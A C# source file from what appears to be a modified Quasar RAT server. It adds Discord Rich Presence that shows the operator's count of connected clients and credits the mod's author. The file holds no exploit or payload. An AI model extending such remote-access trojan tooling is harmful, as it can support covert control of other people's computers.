﻿using System;
using System.Windows.Forms;
using DiscordRPC;

namespace Quasar.Server.DiscordRPC
{
    internal class DiscordRPC
    {
        private readonly Form _form;
        private bool _enabled;
        private DiscordRpcClient _client;
        private Timer _updateTimer; // Made timer a field for proper cleanup
        private readonly string _applicationId = "1351391347491344445";

        public DiscordRPC(Form form)
        {
            _form = form;
            _enabled = false;
            _client = new DiscordRpcClient(_applicationId);
        }

        public bool Enabled
        {
            get { return _enabled; }
            set
            {
                _enabled = value;
                if (_enabled)
                {
                    if (_client == null || _client.IsDisposed)
                    {
                        _client = new DiscordRpcClient(_applicationId);
                        Console.WriteLine("Discord RPC Client recreated");
                    }
                    if (!_client.IsInitialized)
                    {
                        try
                        {
                            _client.Initialize();
                            Console.WriteLine("Discord RPC Client Initialized");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Failed to initialize Discord RPC: " + ex.Message);
                            return;
                        }
                    }
                    try
                    {
                        _client.OnReady += (sender, e) =>
                        {
                            Console.WriteLine("Discord RPC Ready for " + _form.Text);
                        };
                        SetPresence();
                        _updateTimer = new Timer();
                        _updateTimer.Interval = 5000; // 5 seconds
                        _updateTimer.Tick += (s, e) => SetPresence();
                        _updateTimer.Start();
                        Console.WriteLine("Discord RPC Enabled for " + _form.Text);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Failed to set Discord presence: " + ex.Message);
                    }
                }
                else
                {
                    if (_client != null && _client.IsInitialized)
                    {
                        try
                        {
                            _client.ClearPresence();
                            _client.Deinitialize();
                            if (_updateTimer != null)
                            {
                                _updateTimer.Stop();
                                _updateTimer.Dispose();
                                _updateTimer = null;
                            }
                            Console.WriteLine("Discord RPC Disabled for " + _form.Text);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Failed to disable Discord RPC: " + ex.Message);
                        }
                    }
                }
            }
        }

        private int GetConnectedClientsCount()
        {
            try
            {
                string title = _form.Text;
                int startIndex = title.IndexOf("Connected: ") + "Connected: ".Length;
                int endIndex = title.IndexOf(" ", startIndex) > 0 ? title.IndexOf(" ", startIndex) : title.Length;
                string countStr = title.Substring(startIndex, endIndex - startIndex);
                return int.Parse(countStr);
            }
            catch
            {
                return 0;
            }
        }

        private void SetPresence()
        {
            int connectedClients = GetConnectedClientsCount();
            _client.SetPresence(new RichPresence
            {
                State = $"Connected Clients: {connectedClients}",
                Assets = new Assets
                {
                    LargeImageKey = "default",
                    LargeImageText = "Quasar RAT - Modded by KDot227"
                },
                Timestamps = new Timestamps { Start = DateTime.UtcNow }
            });
        }
    }
}